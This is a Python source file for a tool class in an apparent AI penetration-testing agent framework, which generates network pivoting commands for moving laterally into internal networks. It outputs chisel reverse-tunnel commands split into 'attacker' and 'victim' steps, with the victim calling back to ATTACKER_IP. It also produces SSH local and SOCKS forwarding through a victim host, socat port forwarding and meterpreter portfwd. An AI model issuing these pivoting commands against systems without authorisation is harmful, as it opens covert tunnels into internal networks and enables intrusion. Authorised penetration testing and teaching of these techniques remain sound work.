"""Network Pivot Tool — the art of moving laterally."""

from typing import Any, Dict, List
from testinggpt.tools.base import BaseTool

class NetworkPivotTool(BaseTool):
    """Tool for generating commands and strategies for network pivoting."""

    def __init__(self) -> None:
        """Initialize NetworkPivotTool."""
        super().__init__(
            name="network_pivot",
            description="Generate commands and strategies for network pivoting (tunneling, port forwarding, proxies) into internal networks."
        )

    def get_schema(self) -> dict[str, Any]:
        """Get parameter schema for network pivoting."""
        return {
            "type": "object",
            "properties": {
                "pivot_type": {
                    "type": "string",
                    "enum": ["chisel", "ssh", "socat", "meterpreter"],
                    "description": "The type of pivot tool to use."
                },
                "local_port": {
                    "type": "integer",
                    "description": "Local port to listen on.",
                    "default": 8080
                },
                "remote_host": {
                    "type": "string",
                    "description": "Remote host to tunnel to."
                },
                "remote_port": {
                    "type": "integer",
                    "description": "Remote port to tunnel to."
                }
            },
            "required": ["pivot_type", "remote_host", "remote_port"]
        }

    async def execute(self, pivot_type: str, remote_host: str, remote_port: int, local_port: int = 8080, **kwargs: Any) -> dict[str, Any]:
        """Generate the pivoting command."""
        commands = {
            "chisel": [
                f"# On Attacker:",
                f"./chisel server -p {local_port} --reverse",
                f"# On Victim:",
                f"./chisel client ATTACKER_IP:{local_port} R:{remote_port}:{remote_host}:{remote_port}"
            ],
            "ssh": [
                f"# Local Port Forwarding:",
                f"ssh -L {local_port}:{remote_host}:{remote_port} user@victim_ip",
                f"# Dynamic Port Forwarding (SOCKS):",
                f"ssh -D {local_port} user@victim_ip"
            ],
            "socat": [
                f"# Port Forwarding:",
                f"socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port}"
            ],
            "meterpreter": [
                f"# In Meterpreter session:",
                f"portfwd add -l {local_port} -p {remote_port} -r {remote_host}"
            ]
        }

        selected_commands = commands.get(pivot_type, ["Unknown pivot type"])
        result_msg = f"--- NETWORK PIVOT STRATEGY ({pivot_type.upper()}) ---\n\n"
        result_msg += "\n".join(selected_commands)

        return {
            "success": True,
            "result": result_msg,
            "type": pivot_type,
            "commands": selected_commands
        }
